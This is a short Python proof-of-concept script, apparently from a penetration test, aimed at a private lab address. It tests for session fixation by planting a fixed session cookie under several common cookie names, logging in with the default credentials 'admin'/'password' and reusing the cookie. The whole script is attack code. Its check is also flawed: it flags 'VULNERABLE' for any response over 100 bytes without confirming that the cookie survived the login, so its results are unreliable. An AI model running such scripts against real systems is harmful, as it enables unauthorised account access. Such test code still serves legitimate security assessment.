#!/usr/bin/env python3
"""
PoC for Session Fixation on 192.168.64.4
Vulnerability: Session cookie not rotated after authentication
"""
import urllib.request
import http.cookiejar

target = "http://192.168.64.4"

def get_session_cookie(cookiejar, name):
    for cookie in cookiejar:
        if cookie.name == name:
            return cookie.value
    return None

print("[+] Session Fixation PoC")
print(f"[*] Target: {target}")
print("-" * 60)

# Session cookies to test
test_cookies = [
    "PHPSESSID",
    "JSESSIONID", 
    "ASP.NET_SessionId",
    "session_id"
]

for cookie_name in test_cookies:
    print(f"\n[*] Testing: {cookie_name}")
    
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    
    # Step 1: POST login with specific cookie value (session fixation attempt)
    fixed_cookie_value = "FIXED_SESSION_12345"
    
    # Create a pre-set cookie
    from http.cookiejar import Cookie
    cookie = Cookie(
        version=0, name=cookie_name, value=fixed_cookie_value,
        port=None, port_specified=False,
        domain=target.replace("http://", ""),
        domain_specified=True, domain_initial_dot=False,
        path="/", path_specified=True,
        secure=False, expires=None, discard=True,
        comment=None, comment_url=None, rest={}
    )
    cj.set_cookie(cookie)
    
    # Step 2: POST login credentials
    login_data = urllib.parse.urlencode({
        'username': 'admin',
        'password': 'password'
    }).encode('utf-8')
    
    try:
        req = urllib.request.Request(
            target,
            data=login_data,
            method='POST',
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        opener.open(req, timeout=10)
    except Exception:
        pass
    
    # Step 3: Access protected resource with SAME fixed cookie (no re-login)
    try:
        req = urllib.request.Request(target)
        with opener.open(req, timeout=5) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            
            # If we got content with the fixed cookie, session wasn't rotated
            if len(content) > 100:
                print(f"   [!] VULNERABLE: {cookie_name}")
                print(f"       Fixed session cookie accepted after login")
                print(f"       Cookie value used: {fixed_cookie_value}")
                print(f"       Response length: {len(content)} bytes")
            else:
                print(f"   [-] Cookie not accepted (short response)")
    except Exception as e:
        print(f"   [-] Error: {str(e)[:50]}")

print("\n[+] Session Fixation PoC complete")
